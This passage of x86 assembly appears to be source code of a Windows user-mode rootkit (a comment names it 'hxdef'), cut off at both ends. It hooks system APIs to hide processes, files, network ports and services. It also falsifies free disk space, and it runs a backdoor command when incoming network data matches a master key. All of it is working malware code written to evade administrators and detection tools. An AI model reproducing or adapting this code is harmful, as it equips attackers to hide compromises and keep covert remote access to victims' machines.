 @fNewWSARecv_DoCompareBuf:
  lea edi,[ebx+@cMasterKey]
  call @cmp2pchars_casesens
  test eax,eax
  jz @fNewWSARecv_end

 @fNewWSARecv_doexec:
  xor eax,eax
  mov [esi],eax
  push dword ptr [ebp+008h]
  call @DoExec
  xor eax,eax
  mov ecx,[ebp+014h]
  mov [ecx],eax
  mov [ebp-004h],eax

 @fNewWSARecv_end:
  push 01Ch
  jmp @NewAPITail

 //TEnumServiceGroupW=function(ASCManager:SC_HANDLE;AServiceType,AServiceState:DWORD;var VServiceStatus:TEnumServiceStatusW;ABufSize:DWORD;var VBytesNeeded,VServicesReturned,VResumeHandle:DWORD;AUndocumented:Cardinal):BOOL;stdcall;
 @fNewEnumServiceGroupW:
  push 004h                             //local variables
  call @NewAPIHead
  {
   -004         -       LResult:Boolean
  }
  push 000h
  pop dword ptr [ebp-004h]

  lea eax,[ebx+@HT_OldEnumServiceGroupW]
  test dword ptr [eax+011h],-001h
  jz @fNewEnumServiceGroupW_end
  push dword ptr [ebp+028h]             //AUndocumented
  push dword ptr [ebp+024h]             //VResumeHandle
  push dword ptr [ebp+020h]             //VServicesReturned
  push dword ptr [ebp+01Ch]             //VBytesNeeded
  push dword ptr [ebp+018h]             //ABufSize
  push dword ptr [ebp+014h]             //VServiceStatus
  push dword ptr [ebp+010h]             //AServiceState
  push dword ptr [ebp+00Ch]             //AServiceType
  push dword ptr [ebp+008h]             //ASCManager
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewEnumServiceGroupW_proceed
  call [ebx+@GetLastErrorAddr]
  cmp eax,ERROR_MORE_DATA
  jnz @fNewEnumServiceGroupW_end
 @fNewEnumServiceGroupW_proceed:
  push 001h                             //Unicode
  push dword ptr [ebp+020h]             //VServicesReturned
  push dword ptr [ebp+014h]             //VServiceStatus
  call @ProcessEnumServiceStatus
  mov [ebp-004h],eax

 @fNewEnumServiceGroupW_end:
  push 024h
  jmp @NewAPITail

 //TEnumServicesStatusA=function(ASCManager:SC_HANDLE;AServiceType,AServiceState:DWORD;var VServiceStatus:TEnumServiceStatusA;ABufSize:DWORD;var VBytesNeeded,VServicesReturned,VResumeHandle:DWORD):BOOL;stdcall;
 //this one sux, cuz A does not call W
 @fNewEnumServicesStatusA:
  push 004h                             //local variables
  call @NewAPIHead
  {
   -004         -       LResult:Boolean
  }
  push 000h
  pop dword ptr [ebp-004h]

  lea eax,[ebx+@HT_OldEnumServicesStatusA]
  test dword ptr [eax+011h],-001h
  jz @fNewEnumServicesStatusA_end
  push dword ptr [ebp+024h]                     //VResumeHandle
  push dword ptr [ebp+020h]                     //VServicesReturned
  push dword ptr [ebp+01Ch]                     //VBytesNeeded
  push dword ptr [ebp+018h]                     //ABufSize
  push dword ptr [ebp+014h]                     //VServiceStatus
  push dword ptr [ebp+010h]                     //AServiceState
  push dword ptr [ebp+00Ch]                     //AServiceType
  push dword ptr [ebp+008h]                     //ASCManager
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewEnumServicesStatusA_proceed
  call [ebx+@GetLastErrorAddr]
  cmp eax,ERROR_MORE_DATA
  jnz @fNewEnumServicesStatusA_end

 @fNewEnumServicesStatusA_proceed:
  push 000h                                     //ANSI
  push dword ptr [ebp+020h]                     //VServicesReturned
  push dword ptr [ebp+014h]                     //VServiceStatus
  call @ProcessEnumServiceStatus
  mov [ebp-004h],eax
 @fNewEnumServicesStatusA_end:
  push 020h
  jmp @NewAPITail

 //TEnumServicesStatusExW=function(AManager:SC_HANDLE;AInfoLevel:SC_ENUM_TYPE;AServiceType,AServiceState:DWORD;var VServiceStatus:TEnumServiceStatusW;ABufSize:DWORD;var VBytesNeeded,VServicesReturned,VResumeHandle:DWORD;AGroupName:PWideChar):BOOL;stdcall;
 @fNewEnumServicesStatusExW:
  push 004h                             //local variables
  call @NewAPIHead
  push 000h
  pop dword ptr [ebp-004h]

  lea eax,[ebx+@HT_OldEnumServicesStatusExW]
  test dword ptr [eax+011h],-001h
  jz @fNewEnumServicesStatusExW_end
  push dword ptr [ebp+02Ch]                     //AGroupName
  push dword ptr [ebp+028h]                     //VResumeHandle
  push dword ptr [ebp+024h]                     //VServicesReturned
  push dword ptr [ebp+020h]                     //VBytesNeed
  push dword ptr [ebp+01Ch]                     //ABufSize
  push dword ptr [ebp+018h]                     //VServiceStatus
  push dword ptr [ebp+014h]                     //AServiceState
  push dword ptr [ebp+010h]                     //AServiceType
  push dword ptr [ebp+00Ch]                     //AInfoLevel
  push dword ptr [ebp+008h]                     //AManager
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewEnumServicesStatusExW_proceed
  call [ebx+@GetLastErrorAddr]
  cmp eax,ERROR_MORE_DATA
  jnz @fNewEnumServicesStatusExW_end

 @fNewEnumServicesStatusExW_proceed:
  push 003h                                     //Unicode+Ex
  push dword ptr [ebp+024h]                     //VServicesReturned
  push dword ptr [ebp+018h]                     //VServiceStatus
  call @ProcessEnumServiceStatus
  mov [ebp-004h],eax

 @fNewEnumServicesStatusExW_end:
  push 028h
  jmp @NewAPITail

 //TEnumServicesStatusExA=function(ASCManager:SC_HANDLE;AInfoLevel:SC_ENUM_TYPE;AServiceType,AServiceState:DWORD;var VServiceStatus:TEnumServiceStatusA;ABufSize:DWORD;var VBytesNeeded,VServicesReturned,VResumeHandle:DWORD;AGroupName:PWideChar):BOOL;stdcall;
 //this one sux, cuz A does not call W
 @fNewEnumServicesStatusExA:
  push 004h                             //local variables
  {
   -004         -       LResult:Boolean
  }
  call @NewAPIHead
  push 000h
  pop dword ptr [ebp-004h]

  lea eax,[ebx+@HT_OldEnumServicesStatusExA]
  test dword ptr [eax+011h],-001h
  jz @fNewEnumServicesStatusExA_end
  push dword ptr [ebp+02Ch]                     //AGroupName
  push dword ptr [ebp+028h]                     //VResumeHandle
  push dword ptr [ebp+024h]                     //VServicesReturned
  push dword ptr [ebp+020h]                     //VBytesNeed
  push dword ptr [ebp+01Ch]                     //ABufSize
  push dword ptr [ebp+018h]                     //VServiceStatus
  push dword ptr [ebp+014h]                     //AServiceState
  push dword ptr [ebp+010h]                     //AServiceType
  push dword ptr [ebp+00Ch]                     //AInfoLevel
  push dword ptr [ebp+008h]                     //AManager
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewEnumServicesStatusExA_proceed
  call [ebx+@GetLastErrorAddr]
  cmp eax,ERROR_MORE_DATA
  jnz @fNewEnumServicesStatusExA_end

 @fNewEnumServicesStatusExA_proceed:
  push 002h                                     //ANSI+Ex
  push dword ptr [ebp+024h]                     //VServicesReturned
  push dword ptr [ebp+018h]                     //VServiceStatus
  call @ProcessEnumServiceStatus
  mov [ebp-004h],eax

 @fNewEnumServicesStatusExA_end:
  push 028h
  jmp @NewAPITail

//TLdrInitializeThunk=function(AUnknown1,AUnknown2,AUnknown3:Cardinal):Cardinal;stdcall;
 @fNewLdrInitializeThunk:
  push ebx
  call @GetAddr
  mov ebx,eax
  lea eax,[ebx+@HT_OldLdrInitializeThunk]
  push dword ptr [esp+010h]
  push dword ptr [esp+010h]
  push dword ptr [esp+010h]
  call eax
  push eax

  lea eax,[ebx+@HT_OldLdrInitializeThunk]
  push eax
  lea eax,[ebx+@LdrInitializeThunkAddr]
  push eax
  call @UnhookLocalAPI

  call @RehookMe

  pop eax
  pop ebx
  ret 00Ch

//TNtQueryVolumeInformationFile=function(AFileHandle:THandle;AIoStatusBlock:Pointer;AVolumeInformation:Pointer;AVolumeInformationLength:Cardinal;AVolumeInformationClass:Cardinal):Cardinal;stdcall;
 @fNewNtQueryVolumeInformationFile:
  push 088h                             //local variables
  {
   -088..-00C   -       LBuf:array of Char
   -008         -       LFileMappingAddr:Pointer
   -004         -       LResult:Boolean
  }
  call @NewAPIHead
  push 000h
  pop dword ptr [ebp-004h]

  lea eax,[ebx+@HT_OldNtQueryVolumeInformationFile]
  test dword ptr [eax+011h],-001h
  jz @fNewNtQueryVolumeInformationFile_end
  push dword ptr [ebp+018h]                     //AVolumeInformationClass
  push dword ptr [ebp+014h]                     //AVolumeInformationLength
  push dword ptr [ebp+010h]                     //AVolumeInformation
  push dword ptr [ebp+00Ch]                     //AIoStatusBlock
  push dword ptr [ebp+008h]                     //AFileHandle
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewNtQueryVolumeInformationFile_end

  mov eax,[ebp+018h]
  sub eax,03                                    //FileFsSizeInformation
  jz @fNewNtQueryVolumeInformationFile_go
  sub eax,04                                    //FileFsFullSizeInformation-FileFsSizeInformation
  jnz @fNewNtQueryVolumeInformationFile_end
 @fNewNtQueryVolumeInformationFile_go:
  call @OpenFileMapping
  test eax,eax
  jz @fNewNtQueryVolumeInformationFile_end
  mov [ebp-008h],eax
  mov edi,eax
  push FMP_FREE_SPACE
  call @GetFileMappingConst

  push 000h                     //ReturnLength
  push 07Ch                     //ObjectInformationLength
  lea esi,[ebp-088h]
  push esi                      //ObjectInformation
  push 001h                     //ObjectInformationClass = ObjectNameInformation
  push [ebp+008h]               //ObjectHandle
  call [ebx+@NtQueryObjectAddr]
{  test eax,eax
  jnz @fNewNtQueryVolumeInformationFile_CloseMapping}
  mov esi,[esi+004h]            //uniname.buffer

 @fNewNtQueryVolumeInformationFile_cmp:
  mov al,[edi]
  test eax,eax
  jz @fNewNtQueryVolumeInformationFile_CloseMapping
  call @cmp_wide_pchar_caseinsens_with_wildcard

  push eax
  call @pchar_len
  add edi,eax
  add edi,008h
  pop eax

  test eax,eax
  jz @fNewNtQueryVolumeInformationFile_cmp
 @fNewNtQueryVolumeInformationFile_proceed:
  mov esi,[ebp+010h]
  mov eax,[esi+008h]
  mov edx,[esi+00Ch]
  add eax,[edi-008h]
  adc edx,[edi-004h]
  mov [esi+008h],eax
  mov [esi+00Ch],edx
  cmp [ebp+018h],007h
  jnz @fNewNtQueryVolumeInformationFile_CloseMapping
  mov eax,[esi+010h]
  mov edx,[esi+014h]
  add eax,[edi-008h]
  adc edx,[edi-004h]
  mov [esi+010h],eax
  mov [esi+014h],edx
 @fNewNtQueryVolumeInformationFile_CloseMapping:
  push dword ptr [ebp-008h]
  call @CloseFileMapping
 @fNewNtQueryVolumeInformationFile_end:
  push 014h
  jmp @NewAPITail

//TNtDeviceIoControlFile=function(AFileHandle,AEvent:THandle;AApcRoutine,AApcContext,AIoStatusBlock:Pointer;AIoControlCode:Cardinal;AInputBuffer:Pointer;AInputBufferLength:Cardinal;AOutputBuffer:Pointer;AOutputBufferLength:Cardinal):Cardinal;stdcall;
 @fNewNtDeviceIoControlFile:
  push 090h                             //local variables
  {
   -090..014    -       LBuf:array of Char
   -010         -       LLocPortOfs:Cardinal
   -00C         -       LROWSize:Cardinal
   -008         -       LFileMappingAddr:Pointer
   -004         -       LResult:Boolean
  }
  call @NewAPIHead
  push 000h
  pop dword ptr [ebp-004h]

  lea eax,[ebx+@HT_OldNtDeviceIoControlFile]
  test dword ptr [eax+011h],-001h
  jz @fNewNtDeviceIoControlFile_end
  push dword ptr [ebp+02Ch]                     //AOutputBufferLength
  push dword ptr [ebp+028h]                     //AOutputBuffer
  push dword ptr [ebp+024h]                     //AInputBufferLength
  push dword ptr [ebp+020h]                     //AInputBuffer
  push dword ptr [ebp+01Ch]                     //AIoControlCode
  push dword ptr [ebp+018h]                     //AIoStatusBlock
  push dword ptr [ebp+014h]                     //AApcContext
  push dword ptr [ebp+010h]                     //AApcRoutine
  push dword ptr [ebp+00Ch]                     //AEvent
  push dword ptr [ebp+008h]                     //AFileHandle
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewNtDeviceIoControlFile_end
  mov eax,[ebp+01Ch]                            //AIoControlCode
  cmp eax,000120003h
  jz @fNewNtDeviceIoControlFile_query
  cmp eax,000210012h
  jnz @fNewNtDeviceIoControlFile_end
 @fNewNtDeviceIoControlFile_query:
  lea esi,[ebp-090h]                            //LBuf
  push 000h
  pop [esi]

  push 000h                                     //ReturnLength
  push 07Ch                                     //ObjectInformationLength
  push esi                                      //ObjectInformation
  push 001h                                     //ObjectInformationClass = ObjectNameInformation
  push [ebp+008h]                               //ObjectHandle
  call [ebx+@NtQueryObjectAddr]
{  test eax,eax
  jnz @fNewNtDeviceIoControlFile_end}
  xor eax,eax                                   //cuz of NT4 :(

  push 004h
  pop dword ptr [ebp-010h]                      //LLocPortOfs = UDP
  mov [ebp-00Ch],MIB_UDPROW_SIZE                //LROWSize = UDP
  movzx ecx,word ptr [esi]                      //ecx -> length in AnsiString
  test ecx,ecx
  jz @fNewNtDeviceIoControlFile_end
  add esi,008h                                  //edi -> name in AnsiString
  mov [esi+ecx],ax                              //add null on the end of wchar

  lea edi,[ebx+@cDeviceTCP]
  call @cmp_wide_pchar_caseinsens
  xor ecx,ecx 
  test eax,eax
  jnz @fNewNtDeviceIoControlFile_relevant
  lea edi,[ebx+@cDeviceUDP]
  call @cmp_wide_pchar_caseinsens
  test eax,eax
  jz @fNewNtDeviceIoControlFile_end
  push 01h
  pop ecx
 @fNewNtDeviceIoControlFile_relevant:
  mov eax,[ebp+01Ch]                            //AIoControlCode
  cmp eax,000120003h
  jz @fNewNtDeviceIoControlFile_like_netstat
                           
  cmp dword ptr [ebp+024h],TDI_CONN_IN_SIZE     //AInputBufferLength
  jnz @fNewNtDeviceIoControlFile_end
  mov eax,[ebp+020h]
  mov eax,[eax+010h]                            //TdiConnIn.RemoteAddressLength
  sub eax,03h                                   //should be 3
  jz @fNewNtDeviceIoControlFile_like_fport
  dec eax                                       //or 4
  jnz @fNewNtDeviceIoControlFile_end
 @fNewNtDeviceIoControlFile_like_fport:         //TCP: ecx = 0 | UDP: ecx = 1
  mov esi,[ebp+028h]                            //AOutputBuffer
  test esi,esi
  jz @fNewNtDeviceIoControlFile_end
  push ecx

  call @OpenFileMapping
  test eax,eax
  jz @fNewNtDeviceIoControlFile_pend
  mov [ebp-008h],eax
  mov edi,eax

  push FMP_HIDDEN_PORTS
  call @GetFileMappingConst
  pop ecx
  jecxz @fNewNtDeviceIoControlFile_fgo
  movzx eax,word ptr [edi]
  shl eax,001h
  add edi,eax                                   //number of TCP ports * 2 (sizeof(ushort))
  inc edi
  inc edi                                       //+ sizeof(ushort)
 @fNewNtDeviceIoControlFile_fgo:
  inc edi
  inc edi                                       //+ sizeof(ushort)
  xor eax,eax
  xchg esi,edi
  movzx ecx,word ptr [edi+00Ch]
  xchg ch,cl                                    //htons :)
 @fNewNtDeviceIoControlFile_floop:
  lodsw
  test eax,eax
  jz @fNewNtDeviceIoControlFile_CloseMapping
  cmp eax,ecx
  jnz @fNewNtDeviceIoControlFile_floop
  mov [ebp-004h],0C0000141h                     //STATUS_INVALID_ADDRESS
  push TDI_CONN_OUT_FREE_SIZE
  pop ecx
  xor eax,eax
  rep stosb
  mov eax,[ebp+018h]                            //AIoStatusBlock
  test eax,eax
  jz @fNewNtDeviceIoControlFile_CloseMapping
  mov [eax+004h],ecx
  jmp @fNewNtDeviceIoControlFile_CloseMapping

 @fNewNtDeviceIoControlFile_like_netstat:       //and fport xp
  cmp dword ptr [ebp+024h],024h                 //AInputBufferLength
  jb @fNewNtDeviceIoControlFile_end             //should be => 024h
  mov ecx,[ebp+020h]                            //AInputBuffer
  cmp byte ptr [ecx+001h],004h                  //2nd byte of AInputBuffer
  jne @fNewNtDeviceIoControlFile_end            //should be = 004h
  cmp byte ptr [ecx+011h],001h                  //17th byte of AInputBuffer
  jne @fNewNtDeviceIoControlFile_end            //should be = 001h
  movzx eax,byte ptr [ecx]                      //0 if TCP, 1 if UDP
  push eax
  dec eax
  jz @fNewNtDeviceIoControlFile_dif_ex
  add dword ptr [ebp-00Ch],MIB_TCPROW_SIZE-MIB_UDPROW_SIZE      //LROWSize = TCP
  add dword ptr [ebp-010h],004h                 //LLocPortOfs = TCP

 @fNewNtDeviceIoControlFile_dif_ex:
  movzx eax,byte ptr [ecx+010h]                 //1 = normal, 2 = extended
  dec eax
  jz @fNewNtDeviceIoControlFile_OpenMapping
  dec eax
  jnz @fNewNtDeviceIoControlFile_pend           //no normal, no ex?
  add dword ptr [ebp-00Ch],004h                 //extended = + PID
 @fNewNtDeviceIoControlFile_OpenMapping:
  call @OpenFileMapping
  test eax,eax
  jz @fNewNtDeviceIoControlFile_pend
  mov [ebp-008h],eax
  mov edi,eax

  push FMP_HIDDEN_PORTS
  call @GetFileMappingConst
  pop ecx
  jecxz @fNewNtDeviceIoControlFile_go
  movzx eax,word ptr [edi]
  shl eax,001h
  add edi,eax                                   //number of TCP ports * 2 (sizeof(ushort))
  inc edi
  inc edi                                       //+ sizeof(ushort)

 @fNewNtDeviceIoControlFile_go:
  inc edi
  inc edi                                       //edi on tcp | udp ports

  mov esi,[ebp+028h]                            //AOutputBuffer

  mov eax,[ebp+018h]                            //AIoStatusBlock
  mov eax,[eax+004h]                            //AIoStatusBlock.Information
  cdq

  push dword ptr [ebp-00Ch]                     //LROWSize
  pop ecx

  div ecx
  xchg edx,eax                                  //edx should be 0 after div

  test eax,eax
  jnz @fNewNtDeviceIoControlFile_CloseMapping
  test edx,edx
  jz @fNewNtDeviceIoControlFile_CloseMapping

  xchg esi,edi
 @fNewNtDeviceIoControlFile_row_loop:
  push esi
 @fNewNtDeviceIoControlFile_port_loop:
  lodsw                                         //eax -> hidden port number
  test eax,eax
  jz @fNewNtDeviceIoControlFile_next_row
  xchg ah,al                                    //ntohs
  mov ecx,[ebp-010h]                            //LLocPortOfs
  cmp eax,[edi+ecx]                             //MIB_[TCP|UDP]ROW.dwLocalPort
  jnz @fNewNtDeviceIoControlFile_port_loop
  push edi
  push esi
  push edx

  push dword ptr [ebp-00Ch]                     //LROWSize
  pop ecx
  push ecx

  mov eax,edx
  dec eax
  cdq
  mul ecx

  mov ecx,eax
  mov eax,[ebp-00Ch]                            //LROWSize
  lea esi,[edi+eax]
  rep movsb

  mov eax,[ebp+018h]                            //AIoStatusBlock
  mov ecx,[ebp-00Ch]                            //LROWSize
  sub dword ptr [eax+004h],ecx                  //AIoStatusBlock.Information

  pop ecx
  xor eax,eax
  rep stosb                                     //del last record
                                                //we don't need this cuz of changing AIoStatusBlock.Information
                                                //but would be possible to detect hxdef when
                                                //debugging netstat cuz may be quite strange to have last record
                                                //copied several times after the end of AOutputBuffer

  pop edx
  pop esi
  pop edi
  jmp @fNewNtDeviceIoControlFile_next_record

 @fNewNtDeviceIoControlFile_next_row:
  add edi,[ebp-00Ch]

 @fNewNtDeviceIoControlFile_next_record:
  pop esi
  dec edx
  jnz @fNewNtDeviceIoControlFile_row_loop

 @fNewNtDeviceIoControlFile_CloseMapping:
  push dword ptr [ebp-008h]
  call @CloseFileMapping
  push ecx
 @fNewNtDeviceIoControlFile_pend:
  pop ecx
 @fNewNtDeviceIoControlFile_end:
  push 028h
  jmp @NewAPITail

//TNtOpenProcess=function(AFileHandle:PHandle;ADesiredAccess:Cardinal;AObjectAttributes:PObjectAttributes;AClientId:PClientId):Cardinal;stdcall;
 @fNewNtOpenProcess:
  push 004h                             //local variables
  {
   -004         -       LResult:Boolean
  }
  call @NewAPIHead
  push 000h
  pop dword ptr [ebp-004h]

  lea eax,[ebx+@HT_OldNtOpenProcess]
  test dword ptr [eax+011h],-001h
  jz @fNewNtOpenProcess_end
  push dword ptr [ebp+014h]                     //AClientId
  push dword ptr [ebp+010h]                     //AObjectAttributes
  push dword ptr [ebp+00Ch]                     //ADesiredAccess
  push dword ptr [ebp+008h]                     //AProcessHandle
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jnz @fNewNtOpenProcess_end
  mov eax,[ebp+014h]                            //AClientId
  test eax,eax
  jz @fNewNtOpenProcess_end
  push 000h                                     //ctHiddenProcess

  push dword ptr [eax]                          //AClientId.UniqueProcess
  call @CheckProcess
  test eax,eax
  jz @fNewNtOpenProcess_end
  mov [ebp-004h],0C000000Dh                     //STATUS_INVALID_PARAMETER
  mov edi,[ebp+008h]
  test edi,edi
  jz @fNewNtOpenProcess_end
  push dword ptr [edi]
  call [ebx+@CloseHandleAddr]
  push 000h
  pop dword ptr [edi]

 @fNewNtOpenProcess_end:
  push 010h
  jmp @NewAPITail

//TNtCreateFile=function(AFileHandle:PHandle;ADesiredAccess:Cardinal;AObjectAttributes:PObjectAttributes;AIoStatusBlock:PIoStatusBlock;AAllocationSize:PLARGE_INTEGER;AFileAttributes,AShareAccess,ACreateDisposition,ACreateOptions:Cardinal;AEaBuffer:Pointer;AEaLength:Cardinal):Cardinal;stdcall;
 @fNewNtCreateFile:
  push 008h                             //local variables
  {
   -008         -       LCheckRes:Boolean
   -004         -       LResult:Boolean
  }
  call @NewAPIHead
  mov dword ptr [ebp-004h],0C0000034h           //STATUS_OBJECT_NAME_NOT_FOUND
  push 000h
  pop dword ptr [ebp-008h]                      //LCheckRes

  mov edi,[ebp+024h]                            //ACreateDisposition
  mov eax,edi
  mov esi,edi 
  dec eax                                       //FILE_OPEN = 1
  jz @fNewNtCreateFile_check
  dec eax                                       //FILE_CREATE = 2
  jz @fNewNtCreateFile_check
  dec eax                                       //FILE_OPEN_IF = 3
  jnz @fNewNtCreateFile_call
 @fNewNtCreateFile_check:
  push dword ptr [ebp+010h]                     //AObjectAttributes
  call @CheckFileObjectAttributes
  mov [ebp-008h],eax                            //LCheckRes
  test eax,eax
  jz @fNewNtCreateFile_call
  dec esi
  dec esi
  jz @fNewNtCreateFile_call                     //FILE_CREATE = 2
  dec esi                                       //FILE_OPEN_IF = 3
  jnz @fNewNtCreateFile_end                     //it is FILE_OPEN
  push 002h                                     //FILE_CREATE
  pop edi

 @fNewNtCreateFile_call:
  lea eax,[ebx+@HT_OldNtCreateFile]
  test dword ptr [eax+011h],-001h
  jz @fNewNtCreateFile_end
  push dword ptr [ebp+030h]                     //AEaLength
  push dword ptr [ebp+02Ch]                     //AEaBuffer
  push dword ptr [ebp+028h]                     //ACreateOptions
  push edi                                      //ACreateDisposition
  push dword ptr [ebp+020h]                     //AShareAccess
  push dword ptr [ebp+01Ch]                     //AFileAttributes
  push dword ptr [ebp+018h]                     //AAllocationSize
  push dword ptr [ebp+014h]                     //AIoStatusBlock
  push dword ptr [ebp+010h]                     //AObjectAttributes
  push dword ptr [ebp+00Ch]                     //ADesiredAccess
  push dword ptr [ebp+008h]                     //AFileHandle
  call eax
  mov [ebp-004h],eax                            //LResult
  test eax,eax
  jz @fNewNtCreateFile_end                      //if NOT SUCCESS

  mov ecx,[ebp-008h]                            //LCheckRes
  jecxz @fNewNtCreateFile_end
  cmp eax,0C0000035h                            //STATUS_OBJECT_NAME_COLLISION
  jne @fNewNtCreateFile_end
  dec dword ptr [ebp-004h]                      //LResult = STATUS_OBJECT_NAME_NOT_FOUND = 0C0000034h

 @fNewNtCreateFile_end:
  push 02Ch
  jmp @NewAPITail

 //TNtOpenFile=function(AFileHandle:PHandle;ADesiredAccess:Cardinal;AObjectAttributes:PObjectAttributes;AIoStatusBlock:PIoStatusBlock;AShareAccess,AOpenOptions:Cardinal):Cardinal;stdcall;
 @fNewNtOpenFile:
  push 004h                             //local variables
  {
   -004         -       LResult:Boolean
  }
  call @NewAPIHead
  mov dword ptr [ebp-004h],0C0000034h           //STATUS_OBJECT_NAME_NOT_FOUND

  push dword ptr [ebp+010h]                     //AObjectAttributes
  call @CheckFileObjectAttributes
  test eax,eax
  jnz @fNewNtOpenFile_end

 @fNewNtOpenFile_call:
  lea eax,[ebx+@HT_OldNtOpenFile]
  test dword ptr [eax+011h],-001h
  jz @fNewNtOpenFile_end
  push dword ptr [ebp+01Ch]                     //AOpenOptions
  push dword ptr [ebp+018h]                     //ASharedAccess
  push dword ptr [ebp+014h]                     //AIoStatusBlock
  push dword ptr [ebp+010h]                     //AObjectAttributes
  push dword ptr [ebp+00Ch]                     //ADesiredAccess
  push dword ptr [ebp+008h]                     //AFileHandle
  call eax
  mov [ebp-004h],eax
  jmp @fNewNtOpenFile_end

 @fNewNtOpenFile_end:
  push 018h
  jmp @NewAPITail

 //TNtNotifyChangeDirectoryFile=function(AFileHandle,AEvent:THandle;AApcRoutine,AApcContext:Pointer;AIoStatusBlock:PIoStatusBlock,ABuffer:Pointer;ABufferLength,ANotifyFilter:Cardinal;AWatchSubtree:LongBool):Cardinal;stdcall;
 @fNewNtNotifyChangeDirectoryFile:
  push 004h                             //local variables
  {
   -004         -       LResult:Boolean
  }
  call @NewAPIHead
  push 000h
  pop dword ptr [ebp-004h]

  lea eax,[ebx+@HT_OldNtNotifyChangeDirectoryFile]
  test dword ptr [eax+011h],-001h
  jz @fNewNtNotifyChangeDirectoryFile_end
  push dword ptr [ebp+028h]                     //AWatchSubtree
  push dword ptr [ebp+024h]                     //ANotifyFileter
  push dword ptr [ebp+020h]                     //ABufferLength
  push dword ptr [ebp+01Ch]                     //ABuffer
  push dword ptr [ebp+018h]                     //AIoStatusBlock
  push dword ptr [ebp+014h]                     //AApcContext
  push dword ptr [ebp+010h]                     //AApcRoutine
  push dword ptr [ebp+00Ch]                     //AEvent
  push dword ptr [ebp+008h]                     //AFileHandle
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jl @fNewNtNotifyChangeDirectoryFile_end

  lea esi,[ebp+008h]                            //args
  mov eax,[ebp+00Ch]                            //AEvent
  test eax,eax
  jnz @fNewNtNotifyChangeDirectoryFile_Hash
  mov eax,[ebp+008h]                            //AFileHandle

 @fNewNtNotifyChangeDirectoryFile_Hash:
  push esi                                      //entry
  push eax                                      //Event | FileHandle
  call @Notify_AddHashEntry

 @fNewNtNotifyChangeDirectoryFile_end:
  push 024h
  jmp @NewAPITail

 //TNtWaitForSingleObject=function(AHandle:THandle;AAlertable:LongBool;ATimeout:PLARGE_INTEGER):Cardinal;stdcall;
 @fNewNtWaitForSingleObject:
  push 024h                                     //local variables
  {
   -024         -       LCurrentTimeLo:Cardinal
   -020         -       LCurrentTimeHi:Cardinal
   -01C         -       LTimeoutPtr:Pointer
   -018         -       LOrigTimeoutLo:Cardinal
   -014         -       LOrigTimeoutHi:Cardinal
   -010         -       LUseNewTimeout:Boolean
   -00C         -       LTimeoutLo:Cardinal
   -008         -       LTimeoutHi:Cardinal
   -004         -       LResult:Cardinal
  }
  call @NewAPIHead
  push 000h
  
  pop dword ptr [ebp-004h]                      //LResult
  push 001h
  pop dword ptr [ebp-010h]                      //LUseNewTimeout
  or [ebp-008h],-001h                           //LTimeoutHi
  mov eax,NEW_WAIT_TIMEOUT
  neg eax
  mov [ebp-00Ch],eax                            //LTimeoutLo
  
  lea eax,[ebp-00Ch]                            //LOrigTimeoutLo
  mov [ebp-01Ch],eax                            //LTimeoutPtr

  mov edi,[ebp+010h]                            //ATimeout
  test edi,edi
  jz @fNewNtWaitForSingleObject_call
  test [edi+004h],080000000h                    //ATimeout^.Hi = negative ? => relative time
  jz @fNewNtWaitForSingleObject_call
  mov eax,[edi]                                 //ATimeout^.Lo
  mov [ebp-018h],eax                            //LOrigTimeoutLo
  mov eax,[edi+004h]                            //ATimeout^.Hi
  mov [ebp-014h],eax                            //LOrigTimeoutHi

  cmp dword ptr [edi+004h],-001h                //ATimeout^.Hi
  jnz @fNewNtWaitForSingleObject_call
  mov eax,NEW_WAIT_TIMEOUT
  neg eax
  cmp dword ptr [edi],eax                       //ATimeout^.Lo
  jbe @fNewNtWaitForSingleObject_call

  push 000h
  pop dword ptr [ebp-010h]                      //LUseNewTimeout
  mov [ebp-01Ch],edi                            //LTimeout

 @fNewNtWaitForSingleObject_call:
  lea eax,[ebx+@HT_OldNtWaitForSingleObject]
  test dword ptr [eax+011h],-001h
  jz @fNewNtWaitForSingleObject_end
  push dword ptr [ebp-01Ch]                     //LTimeoutPtr
  push dword ptr [ebp+00Ch]                     //AAlertable
  push dword ptr [ebp+008h]                     //AHandle
  call eax
  mov [ebp-004h],eax
  test eax,eax
  jl @fNewNtWaitForSingleObject_end
  cmp eax,STATUS_TIMEOUT
  jnz @fNewNtWaitForSingleObject_check_handle
  cmp dword ptr [ebp-010h],000h                 //LUseNewTimeout
  jz @fNewNtWaitForSingleObject_end
  test edi,edi                                  //ATimeout = null = INFINITE ?
  jz @fNewNtWaitForSingleObject_check_unhook
  test [edi+004h],080000000h                    //ATimeout^.Hi = negative ? => relative time
  jz @fNewNtWaitForSingleObject_absolute_time

  add [ebp-018h],NEW_WAIT_TIMEOUT               //LOrigTimeoutLo - NEW_WAIT_TIMEOUT
  adc [ebp-014h],000h                           //LOrigTimeoutHi

  mov ecx,[ebp-014h]                            //LOrigTimeoutHi
  jecxz @fNewNtWaitForSingleObject_end          //timeout
  
  cmp [ebp-014h],-001h                          //LOrigTimeoutHi
  jnz @fNewNtWaitForSingleObject_check_unhook
  mov ecx,NEW_WAIT_TIMEOUT
  neg ecx
  cmp ecx,[ebp-018h]                            //LOrigTimeoutLo
  jae @fNewNtWaitForSingleObject_check_unhook
  mov eax,[ebp-018h]
  mov [ebp-00Ch],eax                            //LTimeoutLo
  jmp @fNewNtWaitForSingleObject_check_unhook

 @fNewNtWaitForSingleObject_absolute_time:
  lea eax,[ebp-024h]                            //LCurentTimeLo
  push eax                                      //CurrentTime
  call [ebx+@NtQuerySystemTimeAddr]
  mov eax,[ebp-020h]                            //LCurrentTimeHi
  cmp eax,[edi+004h]                            //ATimeout^.Hi
  ja @fNewNtWaitForSingleObject_end
  jb @fNewNtWaitForSingleObject_check_unhook
  mov eax,[ebp-024h]                            //LCurrentTimeLo
  cmp eax,[edi]                                 //ATimeout^.Lo
  jae @fNewNtWaitForSingleObject_end

 @fNewNtWaitForSingleObject_check_unhook:
  movzx ecx,[ebx+@LUnhookInProgress]
  test ecx,ecx
  jz @fNewNtWaitForSingleObject_call
 //here we have to exit this hooked code cuz unhook is in progress
  test edi,edi
